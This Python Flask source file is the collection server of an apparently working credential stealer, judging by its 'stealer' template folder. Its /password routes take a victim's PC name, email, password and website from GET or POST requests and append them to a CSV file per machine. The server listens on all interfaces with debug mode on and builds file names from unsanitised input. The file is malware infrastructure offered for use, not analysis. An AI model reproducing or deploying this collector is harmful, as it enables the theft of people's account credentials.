import os
import json

from flask import Flask, render_template, request, redirect


if os.name == 'posix':
    SLASH = "/"
    CLEAR = "clear"
else:
    SLASH = "\\"
    CLEAR = "cls"


app = Flask(__name__, 
            template_folder=os.getcwd()+SLASH+"stealer"+SLASH+"web"+SLASH+"templates"+SLASH, 
            static_folder=os.getcwd()+SLASH+"stealer"+SLASH+"web"+SLASH+"static"+SLASH)


@app.route("/")
def index():
    print(request.args.get("pcname"), request.args.get("key"))
    return render_template("index.html")


@app.route("/password", methods=["GET", "POST"])
def passwords():

    if request.method == 'GET':

        pcName = request.args.get("pcname")
        email = request.args.get("email")
        password = request.args.get("password")
        website = request.args.get("website")

        if pcName is None:
            pcName = "-"
        
        if email is None:
            email = "-"
        
        if password is None:
            password = "-"
        
        if website is None:
            website = "-"

        if not(f"{pcName}.csv" in os.listdir(f"{os.getcwd()}")):
            with open(f"{pcName}.csv", "w", encoding="utf-8") as temp:
                temp.write('''"website","email","password"''')

        with open(f"{pcName}.csv", "r", encoding="utf-8") as fr:
            frd = fr.readlines()

        for line in frd:
            try:
                splitted = line.split(",")
                if splitted[0].strip() == '"' + str(website) + '"':
                    if splitted[1].strip() == '"' + str(email) + '"':
                        return render_template("password.html")
            except Exception as e:
                print("Error", e) 
       
        with open(f"{pcName}.csv", "a", encoding="utf-8") as fw:
            fw.write(f'''\n"{website}","{email}","{password}"''')

        return render_template("password.html")
    
    elif request.method == 'POST':

        pcName = request.values.get('pcname')
        email = request.values.get('email')
        password = request.values.get('password')
        website = request.values.get('website')

        if pcName is None:
            pcName = "-"
        
        if email is None:
            email = "-"
        
        if password is None:
            password = "-"
        
        if website is None:
            website = "-"

        if not(f"{pcName}.csv" in os.listdir(f"{os.getcwd()}")):
            with open(f"{pcName}.csv", "w", encoding="utf-8") as temp:
                temp.write('''"website","email","password"''')

        with open(f"{pcName}.csv", "r", encoding="utf-8") as fr:
            frd = fr.readlines()

        for line in frd:
            try:
                splitted = line.split(",")
                if splitted[0].strip() == '"' + str(website) + '"':
                    if splitted[1].strip() == '"' + str(email) + '"':
                        return render_template("password.html")
            except Exception as e:
                print("Error", e)
       
        with open(f"{pcName}.csv", "a", encoding="utf-8") as fw:
            fw.write(f'''\n"{website}","{email}","{password}"''')

        return render_template("password.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8090, debug=True)
